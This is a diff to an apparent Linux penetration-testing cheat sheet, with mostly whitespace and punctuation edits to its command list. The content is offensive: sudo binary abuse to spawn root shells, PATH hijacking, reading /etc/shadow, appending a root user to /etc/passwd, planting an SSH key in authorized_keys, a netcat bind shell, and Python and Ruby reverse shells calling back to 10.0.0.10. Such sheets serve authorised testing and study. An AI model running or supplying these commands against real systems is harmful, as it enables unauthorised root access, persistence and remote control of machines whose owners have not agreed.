@@ -3,7 +3,7 @@ Linux
  
 # Compile
 
-gcc -o test test.c                   Compile test
+gcc test.c -o test                   Compile test
 chmod 755 test                       Make the file executable
 ./test                               Run the file
 ------------------------------------------------------------------------------------------------------
@@ -23,12 +23,12 @@ zip -9 test.zip test
 zip -r test.zip test/
 ------------------------------------------------------------------------------------------------------ 
 
-# Copy Files (Remotely)
+# Copy Files (remotely)
  
 scp /path/to/local/file.txt user@targetIP:/path/to/share     Local to remote
 scp -r user@targetIP:/path/to/share /local/share             Remote to local
 
-# Append File (Remotely)
+# Append File (remotely)
 
 cat ~/.ssh/id_rsa.pub | ssh user@targetIP 'cat >> .ssh/authorized_keys'
 ------------------------------------------------------------------------------------------------------
@@ -117,6 +117,7 @@ rpm -vhU app.rpm                     Install RPM package
 dpkg-query -l                        Installed packages
 
 pip install -r requirements.txt      Install required packages listed in a file
+
 python3 -m pip install -r requirements.txt
 ------------------------------------------------------------------------------------------------------
 
@@ -154,29 +155,42 @@ gateway 10.0.3.1
 
 # Privilege Escalation
 
-- Automated scripts.
-enum4linux.pl -a <target IP>              wget https://raw.githubusercontent.com/portcullislabs/enum4linux/master/enum4linux.pl
-linenum.sh                                wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
-linuxprivchecker.py                       wget https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
-lynis audit system                        wget https://downloads.cisofy.com/lynis/lynis-2.7.5.tar.gz
+- Automated scripts
+enum4linux.pl -a <target IP>         wget https://raw.githubusercontent.com/portcullislabs/enum4linux/master/enum4linux.pl
+linenum.sh                           wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+linuxprivchecker.py                  wget https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
+lynis audit system                   wget https://downloads.cisofy.com/lynis/lynis-2.7.5.tar.gz
 
 - sudoers
-sudo -l                                   Check for binaries that can be ran with root privs
+sudo -l                              Check for binaries that can be ran with root privs
 
-- Abuse binaries.
-sudo apache2 -f /etc/shadow               View a system file.
+- Abusing binaries
+sudo apache2 -f /etc/shadow          View a system file
 sudo awk 'BEGIN {system("/bin/bash")}'
+bash -p
 sudo find /home -exec /bin/bash \;
-sudo less /etc/hosts                      !bash and hit enter
-sudo man man                              !bash and hit enter
-sudo more /etc/hosts                      !bash and hit enter
+
+touch test
+find test -exec whoami \;
+
+find test -exec netcat -lvp 4444 -e /bin/sh \;
+
+sudo less /etc/passwd                !/bin/sh and hit enter
+sudo man man                         !/bin/sh and hit enter
+sudo more /etc/passwd                !/bin/sh and hit enter
 echo "os.execute('/bin/bash')" > test.nse && sudo nmap --script=test.nse
 sudo perl -e 'exec "/bin/bash";'
 sudo python -c 'import pty;pty.spawn("/bin/bash")'
 sudo taskset 1 /bin/sh -p
 sudo vi
+vim.tiny /etc/shadow
 
-- Add a user to sudoers.
+vim.tiny
+# Press ESC key
+:set shell=/bin/sh
+:shell
+
+- Add a user to sudoers
 #!/usr/bin/env python
 import os
 import sys
@@ -185,19 +199,19 @@ try:
 except:
      sys.exit()
 
-- Check for binaries with the Sticky bit, SUID, and GUID.
-find / -perm -1000 -type d 2>/dev/null    Sticky bit - only the owner of a directory or a file can delete or rename.
-find / -perm -u=s -type f 2>/dev/null     SUID (chmod 4000) - run as the owner, not the user who started it.
-find / -perm -g=s -type f 2>/dev/null     GUID (chmod 2000) - run as the group, not the user who started it.
+- Check for binaries with the Sticky, SUID, and GUID bit set
+find / -perm -1000 -type d 2>/dev/null               Sticky - only the owner of a directory or a file can delete or rename
+find / -user root -perm -4000 -print 2>/dev/null     SUID - run the file with permissions of its owner
+find / -user root -perm -6000 -print 2>/dev/null     GUIID - run the file with permissions of the owner's group
 
-- Abuse the PATH variable.
+- Abuse the PATH variable
 echo '/bin/sh' > whoami
 chmod 777 whoami
 export PATH=/tmp:$PATH
 /usr/bin/bin_with_suid
 id                                        User and group info on the current user
 
-- Check for world-writable files and folders.
+- Check for world-writable files and folders
 find / -perm -o+w -type f 2>/dev/null     World-writeable files
 find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print    World-writeable files
 
@@ -205,19 +219,19 @@ find / -writable -type d 2>/dev/null      World-writeable folders
 find / -perm -222 -type d 2>/dev/null     World-writeable folders
 find / -perm -o+w -type d 2>/dev/null     World-writeable folders
 
-- Check for world-execuable files and folders.
+- Check for world-execuable files and folders
 find / -perm -o+x -type f 2>/dev/null     World-executable files
 find / -perm -o+x -type d 2>/dev/null     World-executable folders
 
-- Check for world-writeable & world-executable folders.
+- Check for world-writeable & world-executable folders
 find / \( -perm -o+w -perm -o+x \) -type d 2>/dev/null
 
-- Check for files owned by no owner.
+- Check for files owned by no owner
 find /dir -xdev \( -nouser -o -nogroup \) -print
 
 - Cron jobs
-crontab -l                                Check for entries
-ls -l /etc/cron*                          Scheduled cron jobs
+crontab -l                           Check for entries
+ls -l /etc/cron*                     Scheduled cron jobs
 
 What files are owned by a particular user, but are not present in their home directory?
 What are the files present in the /home/user folder? Are there any hidden files and folders?
@@ -296,9 +310,9 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.10",4443).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 
 - xterm
-xterm -display 10.0.0.10:1           target - it will connect back to you on TCP port 6001.
-Xnest :1                             attacker - catch the incoming xterm, start an X-Server.
-xhost +targetIP                      attacker - authorize the target to connect to you.
+xterm -display 10.0.0.10:1           target - it will connect back to you on TCP port 6001
+Xnest :1                             attacker - catch the incoming xterm, start an X-Server
+xhost +targetIP                      attacker - authorize the target to connect to you
 ------------------------------------------------------------------------------------------------------
 
 # Screen
@@ -437,7 +451,7 @@ Remote Kali                          sudo -i
                                      vncserver -geometry 2560x1600
 
 OS X                                 Applications > VNC Viewer: localhost:5901
-                                     Enter a password twice, then No.
+                                     Enter a password twice, then No
 
 Remote Kali                          vncserver -kill :1
 ------------------------------------------------------------------------------------------------------
@@ -486,7 +500,7 @@ adduser <user> <group>               Add user to group
 
 - Create a password hash for a new user lee with a password of pass123.
 openssl passwd -1 –salt lee pass123
-Use echo and taskset (part of sudoers) to add the new user with root privileges to /etc/passwd.
+Use echo and taskset (part of sudoers) to add the new user with root privileges to /etc/passwd
 taskset 1 echo 'lee:$1$mark$PL9HIgTDwnE9sG27q2Nrb/:0:0:root/:root:/bin/bash' >>/etc/passwd
 sudo lee
 id
